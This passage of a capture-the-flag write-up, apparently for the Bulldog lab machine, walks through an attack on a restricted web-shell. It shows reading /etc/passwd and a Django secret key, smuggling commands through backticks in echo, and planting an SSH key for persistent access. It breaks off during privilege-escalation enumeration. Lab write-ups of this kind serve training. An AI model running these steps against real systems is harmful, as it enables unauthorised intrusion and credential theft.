&lt;p&gt;[/media/2017.11/3.png]&lt;/p&gt;
&lt;p&gt;Nevertheless nick has access to the restricted web-shell&lt;/p&gt;
&lt;p&gt;[/media/2017.11/4.png]&lt;/p&gt;
&lt;p&gt;We can explore a bit, cat &lt;code&gt;/etc/passwd&lt;/code&gt; but mostly we can access the django secret key in bulldog/settings.py&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat bulldog/settings.py&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# SECURITY WARNING: keep the secret key used in production secret!&lt;/span&gt;
&lt;span class="code-line"&gt;SECRET_KEY = &amp;#39;%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;amp;u+o_g$yi83d*riq&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;o&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we can easily break out of the "jail" with the &lt;code&gt;echo&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n n-Quoted"&gt;`id`&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore we can create a directory &lt;code&gt;.ssh&lt;/code&gt; inside the  django user home:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;echo `mkdir /home/django/.ssh`&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And then echo our ssh public key inside (you need to change the filed size with the firefox inspector):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;echo &amp;#39;ssh-rsa AAAAB3Nt/&amp;lt;SNIP&amp;gt;&amp;#39;&amp;gt; /home/django/.ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we got an interactive shell with ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh -ldjango 10.0.2.4 -p23&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="privesc"&gt;PrivEsc&lt;/h2&gt;
&lt;p&gt;By looking more into the users directory we discover that we have a read access on djangoadmin
files and that a &lt;code&gt;.hiddenadmindirectory&lt;/code&gt; is present with a note and an executable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="nv"&gt;@bulldog&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ahlR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;home&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nov&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nl"&gt;bulldogadmin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;220&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bash_logout&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;3.7&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bashrc&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwx&lt;/span&gt;&lt;span class="o"&gt;------&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cache&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxrwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hiddenadmindirectory&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxrwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nano&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;655&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;selected_editor&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sudo_as_admin_successful&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;217&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wget&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;hsts&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;ls&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cannot&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/home/bulldogadmin/.cache&amp;#39;&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Permission&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;denied&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;hiddenadmindirectory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxrwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bulldogadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Sep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
